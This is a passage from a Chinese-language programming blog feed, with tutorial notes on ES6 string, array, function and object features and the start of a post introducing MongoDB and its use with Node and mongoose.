href="#实例方法：includes-startsWith-endsWith" class="headerlink" title="实例方法：includes(), startsWith(), endsWith()"></a>实例方法：includes(), startsWith(), endsWith()</h2><p>首先定义一个字符串</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> s = <span class="string">'Hello world!'</span></span><br></pre></td></tr></table></figure><ul><li><p><strong>includes()</strong>：返回布尔值，表示是否找到了参数字符串。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s.includes(<span class="string">'w'</span>) <span class="comment">//返回true</span></span><br><span class="line">s.includes(<span class="string">'a'</span>) <span class="comment">//返回false</span></span><br></pre></td></tr></table></figure></li><li><p><strong>startsWith()</strong>：返回布尔值，表示参数字符串是否在原字符串的头部。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s.startsWith(<span class="string">'Hello'</span>) <span class="comment">// 返回true</span></span><br></pre></td></tr></table></figure></li><li><p><strong>endsWith()</strong>：返回布尔值，表示参数字符串是否在原字符串的尾部。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s.endsWith(<span class="string">'!'</span>)<span class="comment">//返回true</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="repeat"><a href="#repeat" class="headerlink" title="repeat()"></a>repeat()</h2><p><code>repeat(n)</code>返回一个字符串，将原字符串重复<code>n</code>次。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'a'</span>.repeat(<span class="number">3</span>) <span class="comment">// "aaa"</span></span><br></pre></td></tr></table></figure><h2 id="🔺模板字符串"><a href="#🔺模板字符串" class="headerlink" title="🔺模板字符串"></a>🔺模板字符串</h2><p>在ES5的时候，我们常用拼接的方式去拼接大量以及想要出现空格的字符串，如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> f = <span class="string">'hhhhh'</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="string">'a'</span> + <span class="string">'b'</span> + <span class="string">'c'</span> + f</span><br></pre></td></tr></table></figure><p>在ES6时，引入了模板字符串解决这个问题</p><blockquote><p>模板字符串（template string）是增强版的字符串，用反引号（`）标识。它可以当作普通字符串使用，也可以用来定义多行字符串，或者在字符串中嵌入变量。</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> name = <span class="string">'lihua'</span></span><br><span class="line"><span class="keyword">let</span> a = <span class="string">` 你好啊， hello world</span></span><br><span class="line"><span class="string"> 我的名字叫 <span class="subst">$&#123;name&#125;</span>，</span></span><br><span class="line"><span class="string"> 很高兴认识大家</span></span><br><span class="line"><span class="string">`</span></span><br></pre></td></tr></table></figure><p>执行结果：</p><p><img src= "/img/loading.gif" data-src="/2020/07/18/ES6%E5%88%9D%E8%AF%86/image-20200714182317464.png" alt="image-20200714182317464"></p><p>其中，<code>${name}</code>可以嵌入其他的变量，以及可以在大括号<code>{}</code>内进行其它的运算以及引用对象属性</p><h1 id="数组扩展"><a href="#数组扩展" class="headerlink" title="数组扩展"></a>数组扩展</h1><p>在ES6中，建议在方法名前加入命名空间，例如：<code>Number.isNaN()</code>，目的是逐步减少全局性方法，使得语言逐步模块化</p><h2 id="扩展运算符"><a href="#扩展运算符" class="headerlink" title="扩展运算符"></a>扩展运算符</h2><p>扩展运算符（spread）是三个点（<code>...</code>）。它好比 rest 参数的逆运算，将一个数组转为用逗号分隔的参数序列。</p><h2 id="Array-from"><a href="#Array-from" class="headerlink" title="Array.from()"></a>Array.from()</h2><p><code>Array.from</code>方法可将伪数组转为真正的数组</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr1 = &#123;</span><br><span class="line">    <span class="string">'0'</span>: <span class="string">'a'</span>,</span><br><span class="line">    <span class="string">'1'</span>: <span class="string">'b'</span>,</span><br><span class="line">    <span class="string">'2'</span>: <span class="string">'c'</span>,</span><br><span class="line">    length: <span class="number">3</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(arr1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> arr2 = <span class="built_in">Array</span>.from(arr1)</span><br><span class="line"><span class="built_in">console</span>.log(arr2)</span><br></pre></td></tr></table></figure><p>执行结果</p><p><img src= "/img/loading.gif" data-src="/2020/07/18/ES6%E5%88%9D%E8%AF%86/image-20200714183721852.png" alt="image-20200714183721852"></p><h2 id="Array-of"><a href="#Array-of" class="headerlink" title="Array.of()"></a>Array.of()</h2><p><code>Array.of</code>方法用于将一组值，转换为数组</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Array</span>.of(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>) <span class="comment">// [1,2,3]</span></span><br></pre></td></tr></table></figure><h2 id="find"><a href="#find" class="headerlink" title="find()"></a>find()</h2><p>方法返回数组中满足提供的测试函数的第一个元素的值。否则返回 <code>undefined</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>].find(<span class="function">(<span class="params">n</span>) =&gt;</span> n === <span class="number">3</span>)</span><br><span class="line"><span class="comment">// 返回3</span></span><br></pre></td></tr></table></figure><h3 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义一个测试数组</span></span><br><span class="line"><span class="keyword">var</span> abc = [&#123;</span><br><span class="line">        id: <span class="number">1</span>,</span><br><span class="line">        name: <span class="string">'拜拜'</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        id: <span class="number">2</span>,</span><br><span class="line">        name: <span class="string">'李四'</span></span><br><span class="line">    &#125;, &#123;</span><br><span class="line">        id: <span class="number">3</span>,</span><br><span class="line">        name: <span class="string">'麻木'</span></span><br><span class="line">    &#125;, &#123;</span><br><span class="line">        id: <span class="number">4</span>,</span><br><span class="line">        name: <span class="string">'天哪'</span></span><br><span class="line">    &#125;, &#123;</span><br><span class="line">        id: <span class="number">5</span>,</span><br><span class="line">        name: <span class="string">'我的'</span></span><br><span class="line">    &#125;</span><br><span class="line">]</span><br><span class="line"><span class="comment">//自己封装find函数</span></span><br><span class="line"><span class="built_in">Array</span>.prototype.findme = <span class="function"><span class="keyword">function</span>(<span class="params">callback</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.length; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span>(callback(<span class="keyword">this</span>[i],i))&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>[i]</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//测试</span></span><br><span class="line"><span class="built_in">console</span>.log(abc.findme(<span class="function"><span class="keyword">function</span>(<span class="params">item</span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> item.id === <span class="number">3</span></span><br><span class="line">&#125;)) </span><br><span class="line"><span class="comment">//结果：&#123; id: 3, name: '麻木' &#125;</span></span><br></pre></td></tr></table></figure><h2 id="findIndex"><a href="#findIndex" class="headerlink" title="findIndex()"></a>findIndex()</h2><p>返回数组中满足提供的测试函数的第一个元素的<strong>索引</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>].findIndex(<span class="function">(<span class="params">n</span>) =&gt;</span> n === <span class="number">3</span>)</span><br><span class="line"><span class="comment">// 返回2</span></span><br></pre></td></tr></table></figure><h2 id="entries-，keys-和-values"><a href="#entries-，keys-和-values" class="headerlink" title="entries()，keys() 和 values()"></a>entries()，keys() 和 values()</h2><p>可以用<code>for...of</code>循环进行遍历</p><p><code>keys()</code>是对键名的遍历</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> index <span class="keyword">of</span> a.keys()) &#123;</span><br><span class="line"><span class="built_in">console</span>.log(index)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/2020/07/18/ES6%E5%88%9D%E8%AF%86/image-20200714212619271.png" alt="image-20200714212619271"></p><p><code>values()</code>是对键值的遍历</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> emm <span class="keyword">of</span> a.values()) &#123;</span><br><span class="line"><span class="built_in">console</span>.log(emm)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/2020/07/18/ES6%E5%88%9D%E8%AF%86/image-20200714212637320.png" alt="image-20200714212637320"></p><p><code>entries()</code>是对键值对的遍历</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> [b,c] <span class="keyword">of</span> a.entries()) &#123;</span><br><span class="line"><span class="built_in">console</span>.log(b,c)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/2020/07/18/ES6%E5%88%9D%E8%AF%86/image-20200714212649931.png" alt="image-20200714212649931"></p><h2 id="includes"><a href="#includes" class="headerlink" title="includes()"></a>includes()</h2><blockquote><p><code>Array.prototype.includes</code>方法返回一个布尔值，表示某个数组是否包含给定的值，与字符串的<code>includes</code>方法类似。</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].includes(<span class="number">2</span>)     <span class="comment">// 返回true</span></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].includes(<span class="number">5</span>)     <span class="comment">// 返回false</span></span><br></pre></td></tr></table></figure><h1 id="函数扩展"><a href="#函数扩展" class="headerlink" title="函数扩展"></a>函数扩展</h1><h2 id="函数参数的默认值"><a href="#函数参数的默认值" class="headerlink" title="函数参数的默认值"></a>函数参数的默认值</h2><p>ES6 允许为函数的参数设置默认值，直接写在参数定义的后面。<code>function a (x, y = 1){}</code>，其中y=1便是默认值</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//函数参数的默认值</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span> (<span class="params">x, y = <span class="number">1</span></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(x,y)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">a(<span class="number">2</span>)</span><br><span class="line">a(<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line">a()</span><br></pre></td></tr></table></figure><p>结果</p><p><img src= "/img/loading.gif" data-src="/2020/07/18/ES6%E5%88%9D%E8%AF%86/image-20200714212744029.png" alt="image-20200714212744029"></p><p>注意:</p><ul><li><p>参数变量是默认声明的，所以不能用<code>let</code>或<code>const</code>再次声明</p></li><li><p>使用参数默认值时，函数不能有同名参数</p></li><li><p>参数默认值是惰性求值的</p></li></ul><h2 id="🔺箭头函数"><a href="#🔺箭头函数" class="headerlink" title="🔺箭头函数"></a>🔺箭头函数</h2><p>ES6 使用<code>=&gt;</code>定义函数。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ES5</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="function"><span class="keyword">function</span> (<span class="params">b</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> b</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ES6</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="function"><span class="params">b</span> =&gt;</span> b</span><br></pre></td></tr></table></figure><p>若不带参数，使用()代表参数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> c = <span class="number">3</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="function"><span class="params">()</span> =&gt;</span> c</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(a())</span><br></pre></td></tr></table></figure><p>若有多个语句，则使用{}将函数体括起来，并加上<code>return</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//多语句使用&#123;&#125;</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="function">(<span class="params">b, c</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> b + c</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(a(<span class="number">2</span>,<span class="number">3</span>))</span><br></pre></td></tr></table></figure><p>若返回对象，为避免<code>{}</code>解析成代码块，使用<code>()</code>将对象括起来</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> getTempItem = <span class="function"><span class="params">id</span> =&gt;</span> (&#123; <span class="attr">id</span>: id, <span class="attr">name</span>: <span class="string">"Temp"</span> &#125;)</span><br></pre></td></tr></table></figure><h3 id="用处"><a href="#用处" class="headerlink" title="用处"></a>用处</h3><p>简化回调函数（使用频率较高）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 正常函数写法</span></span><br><span class="line">[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>].map(<span class="function"><span class="keyword">function</span> (<span class="params">x</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> x * x;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 箭头函数写法</span></span><br><span class="line">[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>].map(<span class="function"><span class="params">x</span> =&gt;</span> x * x);</span><br></pre></td></tr></table></figure><h3 id="使用注意点"><a href="#使用注意点" class="headerlink" title="使用注意点"></a>使用注意点</h3><ol><li><p>🔺函数体内的<code>this</code>对象，就是定义时所在的对象，而不是使用时所在的对象</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">&#123; name = <span class="string">'Jack'</span>, age = <span class="number">18</span> &#125;</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = name</span><br><span class="line">  <span class="keyword">this</span>.age = age</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Person.prototype.sayHello = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`hello name: <span class="subst">$&#123;<span class="keyword">this</span>.name&#125;</span>, age: <span class="subst">$&#123;<span class="keyword">this</span>.age&#125;</span>`</span>)</span><br><span class="line">  &#125;, <span class="number">1000</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> p = Person()</span><br><span class="line">p.sayHello()</span><br></pre></td></tr></table></figure><p>PS：这里node执行不了，原因未知，可能不支持吧</p></li><li><p>不可以当作构造函数，也就是说，不可以使用<code>new</code>命令，否则会抛出一个错误</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> F = <span class="function">(<span class="params">x, y</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> x + y</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> f = <span class="keyword">new</span> F(<span class="number">10</span>, <span class="number">20</span>)</span><br><span class="line"><span class="comment">//报错</span></span><br></pre></td></tr></table></figure></li><li><p>不可以使用<code>arguments</code>对象，该对象在函数体内不存在。如果要用，可以用 rest 参数代替</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> f = <span class="function">(<span class="params">...args</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(args)</span><br><span class="line">  <span class="keyword">return</span> args[<span class="number">0</span>] + args[<span class="number">1</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f(<span class="number">10</span>, <span class="number">20</span>)</span><br></pre></td></tr></table></figure></li><li><p>不可以使用<code>yield</code>命令，因此箭头函数不能用作 Generator 函数</p></li></ol><h1 id="对象扩展"><a href="#对象扩展" class="headerlink" title="对象扩展"></a>对象扩展</h1><h2 id="属性的简洁表示法"><a href="#属性的简洁表示法" class="headerlink" title="属性的简洁表示法"></a>属性的简洁表示法</h2><p>ES6 允许在大括号里面，直接写入变量和函数，作为对象的属性和方法。这样的书写更加简洁</p><p>下面两者相等</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ES5</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="number">1</span></span><br><span class="line"><span class="keyword">var</span> b = &#123;a&#125;</span><br><span class="line"><span class="comment">//ES6</span></span><br><span class="line"><span class="keyword">var</span> b = &#123;<span class="attr">a</span>:<span class="number">1</span>&#125;</span><br></pre></td></tr></table></figure><h2 id="方法的简洁表示"><a href="#方法的简洁表示" class="headerlink" title="方法的简洁表示"></a>方法的简洁表示</h2><h2 id="方法的-name-属性"><a href="#方法的-name-属性" class="headerlink" title="方法的 name 属性"></a>方法的 name 属性</h2><p>函数的<code>name</code>属性，返回函数名。对象方法也是函数，因此也有<code>name</code>属性</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> person = &#123;</span><br><span class="line">  sayName() &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'hello!'</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">person.sayName.name   <span class="comment">// 返回"sayName"</span></span><br></pre></td></tr></table></figure><h2 id="对象属性成员的-get-和-set-方法"><a href="#对象属性成员的-get-和-set-方法" class="headerlink" title="对象属性成员的 get 和 set 方法"></a>对象属性成员的 get 和 set 方法</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xiaoming = &#123;</span><br><span class="line">  name: <span class="string">'Jack'</span>,</span><br><span class="line">  _age: <span class="number">10</span>,</span><br><span class="line">  <span class="keyword">get</span> age () &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>._age</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="keyword">set</span> age (value) &#123;</span><br><span class="line">    <span class="keyword">if</span> (value &lt; <span class="number">0</span> || value &gt; <span class="number">100</span>) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'年龄不合法'</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">this</span>._age = value</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>自我理解，类似于C#的属性构造器，用来保护私有变量_age，通过age更改或访问_age</p><h2 id="Object-keys"><a href="#Object-keys" class="headerlink" title="Object.keys"></a>Object.keys</h2><p>获取一个对象所有键名数组</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.keys(xiaoming))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ES6 </tag>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MongoDB初识以及搭配node使用</title>
      <link href="/2020/07/13/MongoDB%E5%88%9D%E8%AF%86%E4%BB%A5%E5%8F%8A%E6%90%AD%E9%85%8Dnode%E4%BD%BF%E7%94%A8/"/>
      <url>/2020/07/13/MongoDB%E5%88%9D%E8%AF%86%E4%BB%A5%E5%8F%8A%E6%90%AD%E9%85%8Dnode%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="关系型和非关系型数据库"><a href="#关系型和非关系型数据库" class="headerlink" title="关系型和非关系型数据库"></a>关系型和非关系型数据库</h1><h2 id="关系型数据库"><a href="#关系型数据库" class="headerlink" title="关系型数据库"></a>关系型数据库</h2><p>表就是关系，或者说表与表之间存在关系</p><ul><li>所有的关系型数据库都需要通过<code>sql</code>语言来操作</li><li>所有的关系型数据库在操作之前都需要设计表结构</li><li>而且数据表还支持约束<ul><li>唯一的</li><li>主键</li><li>默认值</li><li>非空</li></ul></li></ul><h2 id="非关系型数据库"><a href="#非关系型数据库" class="headerlink" title="非关系型数据库"></a>非关系型数据库</h2><ul><li>非关系型数据库非常的灵活</li><li>有的关系型数据库就是key-value对</li><li>但MongDB是长得最像关系型数据库的非关系型数据库<ul><li>数据库 -》 数据库</li><li>数据表 -》 集合（数组）</li><li>表记录 -》文档对象</li></ul></li></ul><p>一个数据库中可以有多个数据库，一个数据库中可以有多个集合（数组），一个集合中可以有多个文档（表记录）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//也就是说你可以任意的往里面存数据，没有结构性这么一说</span></span><br><span class="line">&#123;</span><br><span class="line">    qq（数据库）:&#123;</span><br><span class="line">       user（集合）:[</span><br><span class="line">           &#123;（文档）&#125;,&#123;&#125;,&#123;&#125;...</span><br><span class="line">       ]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><ul><li>地址：<a href="https://www.mongodb.com/download-center/community" target="_blank" rel="noopener">https://www.mongodb.com/download-center/community</a></li></ul><h2 id="🔺环境配置（安装）"><a href="#🔺环境配置（安装）" class="headerlink" title="🔺环境配置（安装）"></a>🔺环境配置（安装）</h2><ul><li>地址：<a href="https://www.cnblogs.com/xiaozhaoboke/p/11479144.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiaozhaoboke/p/11479144.html</a></li></ul><h2 id="node使用（npm）"><a href="#node使用（npm）" class="headerlink" title="node使用（npm）"></a>node使用（npm）</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i mongoose</span><br></pre></td></tr></table></figure><h2 id="检测环境"><a href="#检测环境" class="headerlink" title="检测环境"></a>检测环境</h2><p>控制台输入<code>mongod --version</code></p><h1 id="启动和关闭数据库"><a href="#启动和关闭数据库" class="headerlink" title="启动和关闭数据库"></a>启动和关闭数据库</h1><p>启动数据库服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mongod --dbpath D:\mongodb\data\db</span><br></pre></td></tr></table></figure><p>关闭服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.在开启服务的控制台，直接Ctrl+C;</span><br><span class="line">2.直接关闭开启服务的控制台。</span><br></pre></td></tr></table></figure><p>启动数据库，连接本地MongoDB服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mongo</span><br></pre></td></tr></table></figure><p>退出</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exit</span><br></pre></td></tr></table></figure><h1 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h1><ul><li><p><code>show dbs</code></p><p>查看数据库列表(数据库中的所有数据库）</p></li><li><p><code>db</code></p><p>查看当前连接的数据库</p></li><li><p><code>use 数据库名称</code></p><p>切换到指定的数据库（没有会新建）</p></li><li><p><code>show collections</code></p><p>查看当前目录下的数据表</p></li><li><p><code>db.表名.find()</code></p><p>查看表中信息</p></li><li><p><code>InsertOne()</code></p><p>插入数据（对象形式，命名字符串加双引号）    </p></li></ul><p><img src= "/img/loading.gif" data-src="/2020/07/13/MongoDB%E5%88%9D%E8%AF%86%E4%BB%A5%E5%8F%8A%E6%90%AD%E9%85%8Dnode%E4%BD%BF%E7%94%A8/image-20200524113123433.png" alt></p><ul><li><p>dropDatabase()</p><p>删除数据库</p></li></ul><h1 id="🔺Node中操作MongoDB"><a href="#🔺Node中操作MongoDB" class="headerlink" title="🔺Node中操作MongoDB"></a>🔺Node中操作MongoDB</h1><ul><li><p>使用官网mongoDB包操作：</p><p><a href="http://mongodb.github.io/node-mongodb-native/" target="_blank" rel="noopener">http://mongodb.github.io/node-mongodb-native/</a></p></li><li><p>第三方包<code>mongoose</code>操作MongoDB数据库</p><p><a href="https://mongoosejs.com/" target="_blank" rel="noopener">https://mongoosejs.com/</a></p><p>官方学习文档</p><p><a href="https://mongoosejs.com/docs/index.html" target="_blank" rel="noopener">https://mongoosejs.com/docs/index.html</a></p></li></ul><h2 id="mongoose初识"><a href="#mongoose初识" class="headerlink" title="mongoose初识"></a>mongoose初识</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//引包</span></span><br><span class="line"><span 